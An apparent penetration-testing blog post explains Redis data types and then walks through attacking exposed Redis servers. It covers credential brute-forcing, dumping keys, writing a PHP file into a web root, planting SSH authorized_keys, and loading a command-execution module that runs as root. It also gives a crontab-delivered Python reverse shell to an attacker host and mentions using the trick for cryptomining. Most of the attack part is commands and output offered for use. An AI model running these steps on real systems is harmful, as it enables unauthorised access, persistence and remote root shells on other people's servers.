<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Redis Pentesting Best Practices" /><meta property="og:locale" content="en" /><meta name="description" content="Redis" /><meta property="og:description" content="Redis" /><link rel="canonical" href="https://secybr.com/posts/redis-pentesting-best-practices/" /><meta property="og:url" content="https://secybr.com/posts/redis-pentesting-best-practices/" /><meta property="og:site_name" content="secybr penetration testing, red teaming and hack tricks." /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-09T00:00:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Redis Pentesting Best Practices" /><meta name="twitter:site" content="@0xhav0c" /><meta name="google-site-verification" content="405asbYxUs5N1iqL1zGg56yq-OlAtdexlSaC3FC7c9s" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-25T12:21:03+03:00","datePublished":"2022-06-09T00:00:00+03:00","description":"Redis","headline":"Redis Pentesting Best Practices","mainEntityOfPage":{"@type":"WebPage","@id":"https://secybr.com/posts/redis-pentesting-best-practices/"},"url":"https://secybr.com/posts/redis-pentesting-best-practices/"}</script><title>Redis Pentesting Best Practices | secybr | penetration testing, red teaming and hack tricks.</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="secybr | penetration testing, red teaming and hack tricks."><meta name="application-name" content="secybr | penetration testing, red teaming and hack tricks."><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><meta content="secybr | penetration testing, red teaming and hack tricks." property="og:site_name"><meta content="Redis Pentesting Best Practices" property="og:title"><meta content="article" property="og:type"><meta content="penetration testing, red teaming and hack tricks." property="og:description"><meta content="https://secybr.com/posts/redis-pentesting-best-practices/" property="og:url"><meta content="2022-06-09T00:00:00+03:00" property="article:published_time"><meta content="https://secybr.com/about/" property="article:author"><meta content="https://secybr.com/assets/img/logo/logo.png" property="og:image"><meta content="pentesting protocols" property="article:section"><meta content="pentesting" property="article:tag"><meta content="redis" property="article:tag"><meta content="best practicies" property="article:tag"><meta property="og:image" content="https://secybr.com/assets/img/logo/logo.png"><meta name="twitter:site" content="secybr"><meta name="twitter:creator" content="0xhav0c"><meta name="twitter:title" content="Redis Pentesting Best Practices"><meta name="twitter:description" content="penetration testing, red teaming and hack tricks."><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://secybr.com/assets/img/logo/logo.png"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6320091248407168" crossorigin="anonymous"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/logo/logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">secybr</a></div><div class="site-subtitle">is a product of 0xhav0c</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>WHO AM I?</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xhav0c" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xhav0c" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xhavocc','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Redis Pentesting Best Practices</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Redis Pentesting Best Practices</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1654722000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 9, 2022 </em> </span> <span> Updated <em class="" data-ts="1656148863" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 25, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/0xhav0c">0xhav0c</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2137 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h1 id="redis">Redis</h1><blockquote class="prompt-tip"><div><p>Redis usually uses port 6379</p></div></blockquote><h1 id="what-is-redis">What is Redis?</h1><p>Redis is an open-source, in-memory data structure store used as a database, cache, and message broker. Redis was created by Salvatore Sanfilippo in 2006 and is written in C.</p><p>It is a NoSQL advanced key-value data store, and is often referred to as a <strong>data structure server</strong> because its keys contain strings, hashes, lists, sets, sorted sets, bitmaps, and hyperloglogs. Redis’ read and write operations are very fast because it stores data in memory. Data can also be stored on the disk or written back to the memory.</p><p>Since Redis stores its data in memory, it is most commonly used as a cache. Some large organizations that use Redis are Twitter, GitHub, Instagram, Pinterest, and Snapchat.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>PORT     STATE SERVICE               VERSION
6379/tcp open  redis                 Redis key-value store 4.0.11 <span class="o">(</span>64 bits<span class="o">)</span>
</pre></table></code></div></div><h2 id="redis-data-types"><span class="mr-2">Redis Data Types</span><a href="#redis-data-types" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Redis is a key-value store, but it supports many types of data structures as values other than strings. The key in Redis is a binary-safe string, with a max size of 512 MB.</p><p>Let’s discuss the data types that are supported in values.</p><h2 id="string"><span class="mr-2">String</span><a href="#string" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>A string in Redis is a sequence of bytes. They are binary safe, so they have a known length that is not determined by any terminating characters. You can store up to 512 megabytes in a Redis string. It can store any type of data, like text, integers, floats, videos, images, or audio files.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>redis 127.0.0.1:6379&gt; SET name <span class="s2">"educative"</span> 
OK 
redis 127.0.0.1:6379&gt; GET name 
<span class="s2">"educative"</span>
</pre></table></code></div></div><p>In this example, <code class="language-plaintext highlighter-rouge">SET</code> and <code class="language-plaintext highlighter-rouge">GET</code> are Redis commands, which we will discuss later. <code class="language-plaintext highlighter-rouge">name</code> is the key, and <code class="language-plaintext highlighter-rouge">educative</code> is the string value that we are storing.</p><h2 id="list"><span class="mr-2">List</span><a href="#list" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>In Redis, lists are lists of strings that are sorted by an insertion order, so the elements are stored in a linked list. You can add elements to either on the head or tail. If we need to insert an element in a list with 500 records, then it will take the same amount of time as adding the element to a list of 50,000 records.</p><p>Here are some examples operations for list the resulting lists:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>LPUSH mylist x   <span class="c"># now the list is "x"</span>
LPUSH mylist y   <span class="c"># now the list is "y","x"</span>
RPUSH mylist z   <span class="c"># now the list is "y","x","z" (RPUSH was used this time)</span>
</pre></table></code></div></div><h3 id="sets"><span class="mr-2">Sets</span><a href="#sets" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Sets in Redis are unordered collections of strings. This value type is similar to List, but sets don’t allow for duplicates, and the elements are not sorted in any order. You can add or remove members in O<em>O</em>(1) time complexity.</p><p>Sets are useful when we want to store data where uniqueness matters. For example, storing the number of unique visitors to a website.</p><h3 id="sorted-sets"><span class="mr-2">Sorted Sets</span><a href="#sorted-sets" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can sort elements with a Sorted Set value type. Each element will is associated with a number, which we call a score. This determines the order.</p><p>For example, if we have a key called <code class="language-plaintext highlighter-rouge">vegetables</code>, and we want to store <code class="language-plaintext highlighter-rouge">carrot</code> and <code class="language-plaintext highlighter-rouge">celery</code> as the value. The score of <code class="language-plaintext highlighter-rouge">carrot</code> is 10, and <code class="language-plaintext highlighter-rouge">celery</code> is 15. Carrot will be first, followed by celery.</p><blockquote class="prompt-info"><div><p>If the score of two different elements is the same, then we check which String is <em>lexicographically</em> bigger.</p></div></blockquote><h3 id="hash"><span class="mr-2">Hash</span><a href="#hash" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In Redis, the hash value type is a field-value pair. They are used to represent objects, but can store many elements and are useful for other tasks as well. A hash takes very little space, so you can store millions of objects in a small hash instance.</p><blockquote class="prompt-tip"><div><p>In fact, a hash can store up to (2^32)-1 field-value pairs, which equates to more that 4 billion.</p></div></blockquote><p>Say we want to store the information about the grades of students. The subject can be the key. The value can be a field-value pair, with the field being the student name and the value being the grade of each student.</p><p>Here is another example to familiarize you with a Redis hash.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>HMSET user:1000 username antirez password P1pp0 age 34
HGETALL user:1000
HSET user:1000 password 12345
HGETALL user:1000
</pre></table></code></div></div><h1 id="redis-pentesting">Redis Pentesting</h1><div class="table-wrapper"><table><thead><tr><th><img data-src="https://www.shodan.io/static/img/favicon.png" alt="https://www.shodan.io/static/img/favicon.png" width="20px" data-proofer-ignore> Shodan search query :<tbody><tr><td><code class="language-plaintext highlighter-rouge">port:6379</code></table></div><h2 id="banner-grabbing"><span class="mr-2">Banner Grabbing</span><a href="#banner-grabbing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Redis is a text based protocol, you can just send the command in a socket and the returned values will be readable. Also remember that Redis can run using ssl/tls (but this is very weird).</p><p>In a regular Redis instance you can just connect using nc or you could also use redis-cli:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nc <span class="nt">-vn</span> 10.10.10.10 6379
redis-cli <span class="nt">-h</span> 10.10.10.10 <span class="c"># sudo apt-get install redis-tools</span>
</pre></table></code></div></div><p>The first command you could try is info. It may return output with information of the Redis instance or something like the following is returned:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nt">-NOAUTH</span> Authentication required.
</pre></table></code></div></div><p>In this last case, this means that you need valid credentials to access the Redis instance.</p><h2 id="automatic-enumeration"><span class="mr-2">Automatic Enumeration</span><a href="#automatic-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Some automated tools that can help to obtain info from a redis instance:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nmap <span class="nt">--script</span> redis-info <span class="nt">-sV</span> <span class="nt">-p</span> 6379 10.10.x.x
msf&gt; use auxiliary/scanner/redis/redis_server
</pre></table></code></div></div><h2 id="redis-credentials"><span class="mr-2">Redis Credentials</span><a href="#redis-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>By default Redis can be accessed without credentials. However, it can be configured to support only password, or username + password.</p><p>It is possible to set a password in <code class="language-plaintext highlighter-rouge">redis.conf</code> file with the parameter requirepass or temporary until the service restarts connecting to it and running: <code class="language-plaintext highlighter-rouge">config set requirepass p@ss$12E45</code>. Also, a username can be configured in the parameter masteruser inside the <code class="language-plaintext highlighter-rouge">redis.conf</code> file.</p><p>If only password is configured the username used is “default”. Also, note that there is no way to find externally if Redis was configured with only password or username+password.</p><p>In cases like this one you will need to find valid credentials to interact with Redis so you could try to brute-force it.</p><p>Redis Password Authentication Bruteforcing Methods</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>msf&gt; use auxiliary/scanner/redis/redis_login
nmap <span class="nt">--script</span> redis-brute <span class="nt">-p</span> 6379 &lt;IP&gt;
hydra –P /path/pass.txt &lt;IP&gt; redis
</pre></table></code></div></div><p>In case you found valid credentials you need to authenticate the session after establishing the connection with the command:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>AUTH &lt;username&gt; &lt;password&gt;
</pre></table></code></div></div><p>Valid credentials will be responded with: <code class="language-plaintext highlighter-rouge">+OK</code></p><h2 id="authenticated-enumeration"><span class="mr-2">Authenticated enumeration</span><a href="#authenticated-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>If the Redis instance is accepting anonymous connections or you found some valid credentials, you can start enumerating the service with the following commands:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>INFO
<span class="o">[</span> ... Redis response with info ... <span class="o">]</span>
client list
<span class="o">[</span> ... Redis response with connected clients ... <span class="o">]</span>
CONFIG GET <span class="k">*</span>
<span class="o">[</span> ... Get config ... <span class="o">]</span>
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>Other Redis commands can be found <a href="https://redis.io/topics/data-types-intro">here</a> and <a href="https://lzone.de/cheat-sheet/Redis">here</a>.</p></div></blockquote><p>Note that the Redis commands of an instance can be renamed or removed in the redis.conf file. For example this line will remove the command FLUSHDB:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>rename-command FLUSHDB <span class="s2">""</span>
</pre></table></code></div></div><ul><li>More about configuring securely a Redis service here: <a href="https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04">https://www.digitalocean.com/community/tutorials/how-to-install-and-secure-redis-on-ubuntu-18-04</a><li>You can also monitor in real time the Redis commands executed with the command monitor or get the top 25 slowest queries with slowlog get 25<li>Find more interesting information about more Redis commands here: <a href="https://lzone.de/cheat-sheet/Redis">https://lzone.de/cheat-sheet/Redis</a></ul><h2 id="dumping-database"><span class="mr-2">Dumping Database</span><a href="#dumping-database" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Inside Redis the databases are numbers starting from 0. You can find if anyone is used in the output of the command info inside the “<code class="language-plaintext highlighter-rouge">Keyspace</code>” chunk:</p><p><img data-src="/assets/img/pitcures/redis/redis.png" alt="Untitled" data-proofer-ignore></p><p>In that example the database 0 and 1 are being used. Database 0 contains 4 keys and database 1 contains 1. By default Redis will use database 0. In order to dump for example database 1 you need to do:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>SELECT 1
<span class="o">[</span> ... Indicate the database ... <span class="o">]</span>
KEYS <span class="k">*</span> 
<span class="o">[</span> ... Get Keys ... <span class="o">]</span>
GET &lt;KEY&gt;
<span class="o">[</span> ... Get Key ... <span class="o">]</span>
</pre></table></code></div></div><p>Dump the database with npm <a href="https://www.npmjs.com/package/redis-dump">redis-dump</a> or python <a href="https://pypi.org/project/redis-utils/">redis-utils</a></p><h2 id="common-redis-vulnerabilities"><span class="mr-2">Common Redis Vulnerabilities</span><a href="#common-redis-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="webshell"><span class="mr-2">Webshell</span><a href="#webshell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>From: <a href="http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html">http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html</a></p><p>You must know the path of the Web site folder:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>root@Urahara:~ redis-cli <span class="nt">-h</span> 10.10.x.x
10.10.x.x:6379&gt; config <span class="nb">set dir</span> /usr/share/nginx/html
OK
10.10.x.x:6379&gt; config <span class="nb">set </span>dbfilename redis.php
OK
10.10.x.x:6379&gt; <span class="nb">set test</span> <span class="s2">"&lt;?php phpinfo(); ?&gt;"</span>
OK
10.10.x.x:6379&gt; save
OK
</pre></table></code></div></div><p>If the webshell access exception, you can empty the database after backup and try again, remember to restore the database.</p><h3 id="ssh"><span class="mr-2">SSH</span><a href="#ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In the output of config get * you could find the home of the redis user (usually <code class="language-plaintext highlighter-rouge">/var/lib/redis</code> or <code class="language-plaintext highlighter-rouge">/home/redis/.ssh</code>), and knowing this you know where you can write the <code class="language-plaintext highlighter-rouge">authenticated_users</code> file to access via ssh with the user redis. If you know the home of other valid user where you have writable permissions you can also abuse it:</p><p>Generate a ssh public-private key pair on your pc:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh-keygen <span class="nt">-t</span> rsa
</pre></table></code></div></div><p>Write the public key to a file :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">(</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span> <span class="nb">cat</span> ./.ssh/id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">&gt;</span> foo.txt
</pre></table></code></div></div><p>Import the file into redis :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cat </span>foo.txt | redis-cli <span class="nt">-h</span> 10.10.x.x <span class="nt">-x</span> <span class="nb">set </span>crackit
</pre></table></code></div></div><p>Save the public key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file on redis server:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>root@Urahara:~ redis-cli <span class="nt">-h</span> 10.10.x.x
10.10.x.x:6379&gt; config <span class="nb">set dir</span> /home/test/.ssh/
OK
10.10.x.x:6379&gt; config <span class="nb">set </span>dbfilename <span class="s2">"authorized_keys"</span>
OK
10.10.x.x:6379&gt; save
OK
</pre></table></code></div></div><p>Finally, you can ssh to the redis server with private key :</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ssh <span class="nt">-i</span> id_rsa <span class="nb">test</span>@10.10.x.x
</pre></table></code></div></div><p>This technique is automated here:</p><p><a href="https://github.com/iw00tr00t/Redis-Server-Exploit">GitHub - iw00tr00t/Redis-Server-Exploit: This will give you shell access on the target system if redis server is not configured properly and faced on the internet without any authentication</a></p><h3 id="crontab"><span class="mr-2">Crontab</span><a href="#crontab" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><blockquote class="prompt-warning"><div><p><code class="language-plaintext highlighter-rouge">10.10.z.z</code> = Attacker, <code class="language-plaintext highlighter-rouge">10.10.x.x</code> = victim redis</p></div></blockquote><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>root@Urahara:~ <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">*/1 * * * * /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\"</span><span class="s2">10.10.z.z</span><span class="se">\"</span><span class="s2">,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\"</span><span class="s2">/bin/sh</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">-i</span><span class="se">\"</span><span class="s2">]);'</span><span class="se">\n\n</span><span class="s2">"</span>|redis-cli <span class="nt">-h</span> 10.10.x.x <span class="nt">-x</span> <span class="nb">set </span>1
OK
root@Urahara:~ redis-cli <span class="nt">-h</span> 10.10.x.x config <span class="nb">set dir</span> /var/spool/cron/crontabs/
OK
root@Urahara:~ redis-cli <span class="nt">-h</span> 10.10.x.x config <span class="nb">set </span>dbfilename root
OK
root@Urahara:~ redis-cli <span class="nt">-h</span> 10.10.x.x save
OK
</pre></table></code></div></div><p>The last example for Ubuntu, for Centos, the above command should be:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>redis-cli <span class="nt">-h</span> 10.10.x.x config <span class="nb">set dir</span> /var/spool/cron/
</pre></table></code></div></div><p>This method can also be used to earn bitcoin ：<a href="https://www.v2ex.com/t/286981#reply14">yam</a></p><h3 id="load-redis-module"><span class="mr-2">Load Redis Module</span><a href="#load-redis-module" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Following the instructions from link below you can compile a redis module to execute arbitrary commands.</p><p><a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">GitHub - n0b0dyCN/RedisModules-ExecuteCommand: Tools, utilities and scripts to help you write redis modules!</a></p><p>Then you need some way to upload the compiled module Load the uploaded module at runtime with <code class="language-plaintext highlighter-rouge">MODULE LOAD /path/to/mymodule.so</code> List loaded modules to check it was correctly loaded: <code class="language-plaintext highlighter-rouge">MODULE LIST</code> Execute commands:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>127.0.0.1:6379&gt; system.exec <span class="s2">"id"</span>
<span class="s2">"uid=0(root) gid=0(root) groups=0(root)</span><span class="se">\n</span><span class="s2">"</span>
127.0.0.1:6379&gt; system.exec <span class="s2">"whoami"</span>
<span class="s2">"root</span><span class="se">\n</span><span class="s2">"</span>
127.0.0.1:6379&gt; system.rev 127.0.0.1 9999
Unload the module whenever you want: MODULE UNLOAD mymodule
